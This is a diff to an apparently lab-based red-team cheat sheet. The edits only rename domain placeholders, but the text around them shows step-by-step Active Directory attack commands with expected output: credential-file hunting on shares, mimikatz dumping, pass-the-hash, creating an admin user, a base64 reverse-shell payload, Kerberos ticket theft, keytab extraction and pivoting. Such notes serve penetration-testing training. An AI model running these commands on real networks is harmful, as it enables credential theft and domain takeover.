@@ -3701,7 +3701,7 @@ Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
 Example #2: Run from a domain computer with alternative domain credentials. Performs Active Directory computer discovery by default.
 
 ```powershell
-$creds = Get-Credential <DOMAIN>\<USER>
+$creds = Get-Credential <USER>
 Invoke-HuntSMBShares -Threads 100 -OutputDirectory C:\Users\Public -Credential $creds
 ```
 
@@ -3775,38 +3775,38 @@ Example #1: Search the network for filenames that may contain creds
 NOTE: matching files are automatically downloaded into `$HOME/.manspider/loot`! (`-n` to disable)
 
 ```bash
-manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> <KEY_WORD3> -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider 192.168.0.0/24 -f <KEY_WORD1> <KEY_WORD2> <KEY_WORD3> -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #2: Search for spreadsheets with a key word in the filename
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -f <KEY_WORD> -e <EXT 1> <EXT 2> -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -f <KEY_WORD> -e <EXT 1> <EXT 2> -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #3: Search for documents containing a key word
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -c <KEY_WORD> -e <EXT 1> <EXT 2> <EXT 3> -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -c <KEY_WORD> -e <EXT 1> <EXT 2> <EXT 3> -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #4: Search for interesting file extensions
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #5: Search for finance-related files
 This example searches financy-sounding directories for filenames containing 5 or more consecutive numbers (e.g. `000202006.EFT`)
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local --dirnames bank financ payable payment reconcil remit voucher vendor eft swift -f '[0-9]{5,}' -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> --dirnames bank financ payable payment reconcil remit voucher vendor eft swift -f '[0-9]{5,}' -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #6: Search for SSH keys by filename
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -e ppk rsa pem ssh rsa -o -f id_rsa id_dsa id_ed25519 -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #7: Search for SSH keys by content
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -e '' -c 'BEGIN .{1,10} PRIVATE KEY' -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #8: Search for password manager files
@@ -3835,12 +3835,12 @@ Example #8: Search for password manager files
 | `.pwmdb`     | Universal Password Manager               |
 
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -e kdbx kdb 1pif agilekeychain opvault lpd dashlane psafe3 enpass bwdb msecure stickypass pwm rdb safe zps pmvault mywallet jpass pwmdb -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 Example #9: Search for certificates
 ```bash
-manspider <SHARE_NAME>.<DOMAIN>.local -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der -d <DOMAIN> -u <USER> -p <PASSWORD>
+manspider <SHARE_NAME>.<corp.local> -e pfx p12 pkcs12 pem key crt cer csr jks keystore key keys der -d <corp> -u <USER> -p <PASSWORD>
 ```
 
 </details>
@@ -3927,7 +3927,7 @@ mimikatz # sekurlsa::logonpasswords
 **Run a CMD as th desired user**
 
 ```cmd
-mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<DOMAIN> /run:cmd.exe" exit
+mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /<HASH_TYPE>:<HASH> /domain:<corp.rth> /run:cmd.exe" exit
 ```
 
 </details>
@@ -3957,14 +3957,14 @@ Import-Module .\Invoke-TheHash.psd1
 **Create a new user and add it to the Adminitrators group**
 
 ```powershell
-Invoke-SMBExec -Target <IP> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
+Invoke-SMBExec -Target <IP> -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add" -Verbose
 ```
 
 **Expected output**
 
 ```powershell
-VERBOSE: [+] <DOMAIN>\<USER> successfully authenticated on <IP>
-VERBOSE: <DOMAIN>\<USER> has Service Control Manager write privilege on <IP>
+VERBOSE: [+] <corp.rth>\<USER> successfully authenticated on <IP>
+VERBOSE: <corp.rth>\<USER> has Service Control Manager write privilege on <IP>
 VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on <IP>
 VERBOSE: [*] Trying to execute command on <IP>
 [+] Command executed with service EGDKNNLQVOLFHRQTQMAU on <IP>
@@ -3999,7 +3999,7 @@ Import-Module .\Invoke-TheHash.psd1
 **Excute the reverse shell**
 
 ```powershell
-Invoke-WMIExec -Target DC01 -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
+Invoke-WMIExec -Target DC01 -Domain <corp.rth> -Username <USER> -Hash <NTLM_HASH> -Command "powershell -e <BASE64_PAYLOAD>"
 ```
 
 The result is a reverse shell connection from the DC01 host.
@@ -4285,13 +4285,13 @@ mimikatz # sekurlsa::ekeys
 Authentication Id : 0 ; 444066 (00000000:0006c6a2)
 Session           : Interactive from 1
 User Name         : <USER>
-Domain            : <DOMAIN>
+Domain            : RTH
 Logon Server      : DC01
 Logon Time        : 7/12/2025 9:42:15 AM
 SID               : S-1-5-21-228825152-3134732153-3833540767-1107
 
          * Username : <USER>
-         * Domain   : <DOMAIN>.local
+         * Domain   : <corp.rth>
          * Password : (null)
          * Key List :
            aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60
@@ -4319,14 +4319,14 @@ mimikatz.exe
 
 ```cmd
 mimikatz # privilege::debug
-mimikatz # sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<NTLM_HASH>
+mimikatz # sekurlsa::pth /domain:<corp.rth> /user:<USER> /ntlm:<NTLM_HASH>
 ```
 
 **Expcted Output**
 
 ```cmd
 user    : <USER>
-domain  : <DOMAIN>
+domain  : <corp.rth>
 program : cmd.exe
 impers. : no
 NTLM    : <NTLM_HASH>
@@ -4356,7 +4356,7 @@ This will create a new **cmd.exe** window that we can use to request access to a
 **Start Rubeus**
 
 ```cmd
-Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3Sfe60 /nowrap
+Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3Sfe60 /nowrap
 ```
 
 > **NOTE:** Rubeus doesn't require administrative rights to perform the Pass the Key.
@@ -4380,7 +4380,7 @@ Now that we have some Kerberos tickets, we can use them to move laterally within
 After executing an OverPass‑the‑Hash attack, you may obtain the resulting ticket in Base64 format. Rather than manually exporting and importing it, you can use the */ptt* flag to automatically inject that ticket—whether it's a **TGT** or a **TGS**—into the current logon session.
 
 ```cmd
-Rubeus.exe asktgt /domain:<DOMAIN> /user:<USER> /rc4:<HASH> /ptt
+Rubeus.exe asktgt /domain:<corp.rth> /user:<USER> /rc4:<HASH> /ptt
 ```
 
 Expected output
@@ -4398,16 +4398,16 @@ Expected output
 [*] Action: Ask TGT
 
 [*] Using rc4_hmac hash: <HASH>
-[*] Building AS-REQ (w/ preauth) for: '<DOMAIN>\<USER>'
+[*] Building AS-REQ (w/ preauth) for: '<corp.rth>\<USER>'
 [+] TGT request successful!
 [*] Base64(ticket.kirbi):
       <BASE64 TICKET>
 [+] Ticket successfully imported!
 
-  ServiceName           :  krbtgt/<DOMAIN>
-  ServiceRealm          :  <DOMAIN>
+  ServiceName           :  krbtgt/<corp.rth>
+  ServiceRealm          :  <corp.rth>
   UserName              :  <USER>
-  UserRealm             :  <DOMAIN>
+  UserRealm             :  <corp.rth>
   StartTime             :  7/12/2025 12:27:47 PM
   EndTime               :  7/12/2025 10:27:47 PM
   RenewTill             :  7/19/2025 12:27:47 PM
@@ -4429,7 +4429,7 @@ Another way is to import the ticket into the current session using the .kirbi fi
 **Use a ticket exported from Mimikatz and import it using Pass the Ticket:**
 
 ```cmd
-Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi
+Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi
 ```
 
 **Expected output:**
@@ -4452,13 +4452,13 @@ v1.5.0
 **Verify that your ticket let you access DC01’s filesystem:**
 
 ```cmd
-dir \\DC01.<DOMAIN>\c$
+dir \\DC01.<corp.rth>\c$
 ```
 
 **Expected output:**
 
 ```cmd
-Directory: \\dc01.<DOMAIN>\c$
+Directory: \\dc01.<corp.rth>\c$
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -4477,7 +4477,7 @@ We can also use the Base64 output from Rubeus or convert a .kirbi to Base64 to p
 **Use PowerShell to convert a .kirbi to Base64:**
 
 ```powershell
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi"))
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"))
 ```
 
 **Expected output:**
@@ -4512,13 +4512,13 @@ v1.5.0
 **Verify that your ticket let you access DC01’s filesystem:**
 
 ```cmd
-dir \\DC01.<DOMAIN>\c$
+dir \\DC01.<corp.rth>\c$
 ```
 
 **Expected output:**
 
 ```cmd
-Directory: \\dc01.<DOMAIN>\c$
+Directory: \\dc01.<corp.rth>\c$
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -4544,20 +4544,20 @@ mimikatz.exe
 
 ```cmd
 mimikatz # privilege::debug
-mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi"
+mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
 mimikatz # exit
 ```
 
 **Verify that your ticket let you access DC01’s filesystem:**
 
 ```cmd
-dir \\DC01.<DOMAIN>\c$
+dir \\DC01.<corp.rth>\c$
 ```
 
 **Expected output:**
 
 ```cmd
-Directory: \\dc01.<DOMAIN>\c$
+Directory: \\dc01.<corp.rth>\c$
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -4601,7 +4601,7 @@ mimikatz.exe
 
 ```cmd
 mimikatz # privilege::debug
-mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<DOMAIN>.kirbi"
+mimikatz # kerberos::ptt "C:\Users\<USER>\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-<USER>@krbtgt-<corp.rth>.kirbi"
 mimikatz # exit
 ```
 
@@ -4626,7 +4626,7 @@ whoami
 **Expected output**
 
 ```powershell
-<DOMAIN>\<USER>
+<corp.rth>\<USER>
 ```
 
 </details>
@@ -4679,7 +4679,7 @@ The above command will open a new cmd window. From that window, we can execute R
 <summary><h4>Rubeus - Pass the Ticket for lateral movement</h4></summary>
 
 ```cmd
-Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES_KEY> /ptt
+Rubeus.exe asktgt /user:<USER> /domain:<corp.rth> /aes256:<AES_KEY> /ptt
 ```
 
 **Expected output**
@@ -4697,17 +4697,17 @@ Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES_KEY> /ptt
 [*] Action: Ask TGT
 
 [*] Using aes256_cts_hmac_sha1 hash: <AES_KEY>
-[*] Building AS-REQ (w/ preauth) for: '<DOMAIN>\<USER>'
+[*] Building AS-REQ (w/ preauth) for: '<corp.rth>\<USER>'
 [*] Using domain controller: <IP>:<PORT>
 [+] TGT request successful!
 [*] Base64(ticket.kirbi):
       <BASE64_TICKET>
 [+] Ticket successfully imported!
 
-  ServiceName              :  krbtgt/<DOMAIN>
-  ServiceRealm             :  <DOMAIN>
+  ServiceName              :  krbtgt/<corp.rth>
+  ServiceRealm             :  <CORP.RTH>
   UserName                 :  <USER>
-  UserRealm                :  <DOMAIN>
+  UserRealm                :  <CORP.RTH>
   StartTime                :  7/18/2025 5:44:50 AM
   EndTime                  :  7/18/2025 3:44:50 PM
   RenewTill                :  7/25/2025 5:44:50 AM
@@ -4738,7 +4738,7 @@ whoami
 **Expected output**
 
 ```powershell
-<DOMAIN>\<USER>
+<corp.rth>\<USER>
 ```
 
 </details>
@@ -4767,7 +4767,7 @@ Typical uses of keytab files include:
 
 > **Note:** Any computer that has a Kerberos client installed can create keytab files. Keytab files can be created on one computer and copied for use on other computers because they are not restricted to the systems on which they were initially created.
 
-> **Note:** A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.<DOMAIN>`
+> **Note:** A computer account needs a ticket to interact with the Active Directory environment. Similarly, a Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user. If we gain access to this ticket, we can impersonate the computer account `LINUX01$.<CORP.RTH>`
 
 </details>
 
@@ -4788,10 +4788,10 @@ realm list
 **Expected output:**
 
 ```bash
-# <DOMAIN>
+# <corp.rth>
 #   type: kerberos
-#   realm-name: <DOMAIN>
-#   domain-name: <DOMAIN>
+#   realm-name: <CORP.RTH>
+#   domain-name: <corp.rth>
 #   configured: kerberos-member
 #   server-software: active-directory
 #   client-software: sssd
@@ -4801,9 +4801,9 @@ realm list
 #   required-package: libpam-sss
 #   required-package: adcli
 #   required-package: samba-common-bin
-#   login-formats: %U@<DOMAIN>
+#   login-formats: %U@<corp.rth>
 #   login-policy: allow-permitted-logins
-#   permitted-logins: david@<DOMAIN>, julio@<DOMAIN>
+#   permitted-logins: david@<corp.rth>, julio@<corp.rth>
 #   permitted-groups: Linux Admins
 ```
 
@@ -4846,7 +4846,7 @@ ps -ef | grep -i "winbind\|sssd"
 
 ```bash
 # root         847       1  0 15:33 ?        00:00:00 /usr/sbin/sssd -i --logger=files
-# root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <DOMAIN> --uid 0 --gid 0 --logger=files
+# root         997     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_be --domain <corp.rth> --uid 0 --gid 0 --logger=files
 # root        1001     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
 # root        1002     847  0 15:33 ?        00:00:00 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
 # root       11451       1  0 17:25 ?        00:00:00 /usr/libexec/sssd/sssd_pac --logger=files --socket-activated
@@ -4913,13 +4913,13 @@ crontab -l
 
 ```bash
 # m h  dom mon dow   command
-# *5/ * * * * /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
+# *5/ * * * * /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 ```
 
 **Step 2: Inspect script for KeyTab usage:**
 
 ```bash
-cat /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
+cat /home/carlos@<corp.rth>/.scripts/kerberos_script_test.sh
 ```
 
 **Expected output:**
@@ -4927,8 +4927,8 @@ cat /home/carlos@<DOMAIN>/.scripts/kerberos_script_test.sh
 ```bash
 #!/bin/bash
 
-# kinit svc_workstations@<DOMAIN> -k -t /home/carlos@<DOMAIN>/.scripts/svc_workstations.kt
-# smbclient //dc01.<DOMAIN>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<DOMAIN>/script-test-results.txt
+# kinit svc_workstations@<CORP.RTH> -k -t /home/carlos@<corp.rth>/.scripts/svc_workstations.kt
+# smbclient //dc01.<corp.rth>/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@<corp.rth>/script-test-results.txt
 ```
 
 </details>
@@ -4970,9 +4970,9 @@ ls -la /tmp
 # total 68
 # drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
 # drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-# -rw-------  1 julio@<DOMAIN>  domain users@<DOMAIN> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-# -rw-------  1 david@<DOMAIN>  domain users@<DOMAIN> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-# -rw-------  1 carlos@<DOMAIN> domain users@<DOMAIN> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
+# -rw-------  1 julio@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 16:38 krb5cc_647401106_tBswau
+# -rw-------  1 david@<corp.rth>  domain users@<corp.rth> 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
+# -rw-------  1 carlos@<corp.rth> domain users@<corp.rth> 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
 ```
 
 We can now impersonate the user with kinit.
@@ -5022,10 +5022,10 @@ klist
 
 ```bash
 # Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
-# Default principal: david@<DOMAIN>
+# Default principal: david@<corp.rth>
 
 # Valid starting     Expires            Service principal
-# 10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/06/25 17:02:11  10/07/25 03:02:11  krbtgt/<CORP.RTH>@<CORP.RTH>
 #         renew until 10/07/25 17:02:11
 ```
 
@@ -5036,7 +5036,7 @@ klist
 **Step 2: Authenticate using the specified keytab, without entering a password.**
 
 ```bash
-kinit carlos@<DOMAIN> -k -t /opt/specialfiles/carlos.keytab
+kinit carlos@<CORP.RTH> -k -t /opt/specialfiles/carlos.keytab
 ```
 
 **Step 3: Confirm the change:**
@@ -5049,10 +5049,10 @@ klist
 
 ```bash
 # Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
-# Default principal: carlos@<DOMAIN>
+# Default principal: carlos@<CORP.RTH>
 
 # Valid starting     Expires            Service principal
-# 10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/<CORP.RTH>@<CORP.RTH>
 ```
 
 > **Note:** The active principal is now carlos, indicating the ticket switched successfully.
@@ -5102,7 +5102,7 @@ python3 ./keytabextract.py /opt/specialfiles/carlos.keytab
 # [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
 # [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
 # [+] Keytab File successfully imported.
-#         REALM : <DOMAIN>
+#         REALM : <CORP.RTH>
 #         SERVICE PRINCIPAL : carlos/
 #         NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
 #         AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
@@ -5124,7 +5124,7 @@ The most straightforward hash to crack is the NTLM hash. We can use tools like H
 **Step 3: Log in as the desired user**
 
 ```bash
-su - carlos@<DOMAIN>
+su - carlos@<corp.rth>
 ```
 
 **Step 4: Obtain more hashes**
@@ -5145,7 +5145,7 @@ After logging in with the `svc_workstations` credentials, we can run `sudo -l` t
 **Step 1: Connect to Target**
 
 ```bash
-ssh svc_workstations@<DOMAIN>@<IP> -p <PORT_TO_FORWARD>
+ssh svc_workstations@<corp.rth>@<IP> -p <PORT_TO_FORWARD>
 ```
 
 **Step 2: Check Sudo Permissions**
@@ -5195,13 +5195,13 @@ If there is an user to whom we have not yet gained access. We can confirm the gr
 **Step 6: Check Group Membership**
 
 ```bash
-id julio@<DOMAIN>
+id julio@<corp.rth>
 ```
 
 **Expected Output:**
 
 ```bash
-# uid=647401106(julio@<DOMAIN>) gid=647400513(domain users@<DOMAIN>) groups=647400513(domain users@<DOMAIN>),647400512(domain admins@<DOMAIN>),647400572(denied rodc password replication group@<DOMAIN>)
+# uid=647401106(julio@<corp.rth>) gid=647400513(domain users@<corp.rth>) groups=647400513(domain users@<corp.rth>),647400512(domain admins@<corp.rth>),647400572(denied rodc password replication group@<corp.rth>)
 ```
 
 Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.
@@ -5225,10 +5225,10 @@ klist
 
 ```bash
 # Ticket cache: FILE:/root/krb5cc_647401106_I8I133
-# Default principal: julio@<DOMAIN>
+# Default principal: julio@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
-# 10/07/2025 13:25:01  10/07/2025 23:25:01  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/07/2025 13:25:01  10/07/2025 23:25:01  krbtgt/<CORP.RTH>@<CORP.RTH>
 #         renew until 10/08/2025 13:25:01
 ```
 
@@ -5282,8 +5282,8 @@ In our case, the attack host cannot directly connect to the **KDC** or resolve d
 **Modify `/etc/hosts`:**
 
 ```bash
-echo "<IP> <DOMAIN> dc01.<DOMAIN> dc01" | sudo tee -a /etc/hosts
-echo "<IP> ms01.<DOMAIN> ms01" | sudo tee -a /etc/hosts
+echo "<DC01_IP> <corp.rth> dc01.<corp.rth> dc01" | sudo tee -a /etc/hosts
+echo "<MS01_IP> ms01.<corp.rth> ms01" | sudo tee -a /etc/hosts
 ```
 
 **Confirm Changes:**
@@ -5297,8 +5297,8 @@ cat /etc/hosts
 ```bash
 # Host addresses
 
-# <IP> <DOMAIN> dc01.<DOMAIN> dc01
-# <IP> ms01.<DOMAIN> ms01
+# <IP> <corp.rth> dc01.<corp.rth> dc01
+# <IP> ms01.<corp.rth> ms01
 ```
 
 **Modify `/etc/proxychains.conf`:**
@@ -5344,7 +5344,7 @@ sudo ./chisel server --reverse
 **Connect to MS01 with xfreerdp**
 
 ```bash
-xfreerdp /v:<IP> /u:<USER> /d:<DOMAIN> /p:<PASSWORD> /dynamic-resolution
+xfreerdp /v:<IP> /u:<USER> /d:<corp.rth> /p:<PASSWORD> /dynamic-resolution
 ```
 
 ---
@@ -5394,12 +5394,12 @@ proxychains impacket-wmiexec dc01 -k
 # Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:445  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <DOMAIN>:88  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
 # [*] SMBv3.0 dialect used
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:135  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <DOMAIN>:88  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
 # [proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01:50713  ...  OK
-# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <DOMAIN>:88  ...  OK
+# [proxychains] Strict chain  ...  127.0.0.1:1080  ...  <CORP.RTH>:88  ...  OK
 # [!] Launching semi-interactive shell - Careful what you execute
 # [!] Press help for extra shell commands
 ```
@@ -5413,7 +5413,7 @@ whoami
 **Expected Output**
 
 ```cmd
-<DOMAIN>\julio
+<corp.rth>\julio
 ```
 
 > **Note:** If you are using Impacket tools from a Linux machine connected to the domain, note that some Linux Active Directory implementations use the FILE: prefix in the KRB5CCNAME variable. If this is the case, we need to modify the variable only to include the path to the ccache file.
@@ -5438,13 +5438,13 @@ In case the package krb5-user is already installed, we need to change the config
 
 ```bash
 # [libdefaults]
-#         default_realm = <DOMAIN>
+#         default_realm = <CORP.RTH>
 
 # ...
 
 # [realms]
-#     <DOMAIN> = {
-#         kdc = dc01.<DOMAIN>
+#     <CORP.RTH> = {
+#         kdc = dc01.<corp.rth>
 #     }
 
 # ...
@@ -5453,7 +5453,7 @@ In case the package krb5-user is already installed, we need to change the config
 **Use Evil-WinRM with Kerberos**
 
 ```bash
-proxychains evil-winrm -i dc01 -r <DOMAIN>
+proxychains evil-winrm -i dc01 -r <corp.rth>
 ```
 
 **Expected Output**
@@ -5477,7 +5477,7 @@ proxychains evil-winrm -i dc01 -r <DOMAIN>
 **Expected Output**
 
 ```powershell
-<DOMAIN>\julio
+<corp.rth>\julio
 ```
 
 **Confirm current host**
@@ -5557,8 +5557,8 @@ klist
 
 # Cached Tickets: (1)
 
-# #0>     Client: julio @ <DOMAIN>
-#         Server: krbtgt/<DOMAIN> @ <DOMAIN>
+# #0>     Client: julio @ <CORP.RTH>
+#         Server: krbtgt/<CORP.RTH> @ <CORP.RTH>
 #         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
 #         Ticket Flags 0xa1c20000 -> reserved forwarded invalid renewable initial 0x20000
 #         Start Time: 10/10/2025 5:46:02 (local)
@@ -5642,7 +5642,7 @@ bash linikatz.sh
 # -rw-r--r-- 1 root root 113 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
 # -rw-r--r-- 1 root root 40 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
 # -rw-r--r-- 1 root root 15 Oct  7 12:17 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
-# -rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.<DOMAIN>
+# -rw-r--r-- 1 root root 12 Oct 10 19:55 /var/lib/sss/pubconf/kdcinfo.<CORP.RTH>
 # -rw------- 1 root root 504 Oct  6 11:16 /etc/sssd/sssd.conf
 # I: [vintella-check] VAS AD configuration
 # I: [pbis-check] PBIS AD configuration
@@ -5652,42 +5652,42 @@ bash linikatz.sh
 # I: [kerberos-check] Kerberos configuration
 # -rw-r--r-- 1 root root 2800 Oct  7 12:17 /etc/krb5.conf
 # -rw------- 1 root root 1348 Oct  4 16:26 /etc/krb5.keytab
-# -rw------- 1 julio@<DOMAIN> domain users@<DOMAIN> 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
-# -rw------- 1 julio@<DOMAIN> domain users@<DOMAIN> 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
-# -rw------- 1 carlos@<DOMAIN> domain users@<DOMAIN> 3175 Oct 10 19:55 /tmp/krb5cc_647402606
+# -rw------- 1 julio@<corp.rth> domain users@<corp.rth> 1406 Oct 10 19:55 /tmp/krb5cc_647401106_HRJDux
+# -rw------- 1 julio@<corp.rth> domain users@<corp.rth> 1414 Oct 10 19:55 /tmp/krb5cc_647401106_R9a9hG
+# -rw------- 1 carlos@<corp.rth> domain users@<corp.rth> 3175 Oct 10 19:55 /tmp/krb5cc_647402606
 # I: [samba-check] Samba machine secrets
 # I: [samba-check] Samba hashes
 # I: [check] Cached hashes
 # I: [sss-check] SSS hashes
 # I: [check] Machine Kerberos tickets
 # I: [sss-check] SSS ticket list
-# Ticket cache: FILE:/var/lib/sss/db/ccache_<DOMAIN>
-# Default principal: LINUX01$@<DOMAIN>
+# Ticket cache: FILE:/var/lib/sss/db/ccache_<CORP.RTH>
+# Default principal: LINUX01$@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
-# 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/11/2022 19:48:03, Flags: RIA
 #     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 # I: [kerberos-check] User Kerberos tickets
 # Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
-# Default principal: julio@<DOMAIN>
+# Default principal: julio@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
-# 10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/<DOMAIN>@<DOMAIN>
+# 10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/<CORP.RTH>@<CORP.RTH>
 #     renew until 10/08/2022 11:32:01, Flags: FPRIA
 #     Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
 # Ticket cache: FILE:/tmp/krb5cc_647401106_R9a9hG
-# Default principal: julio@<DOMAIN>
+# Default principal: julio@<CORP.RTH>
 
 # Valid starting       Expires              Service principal
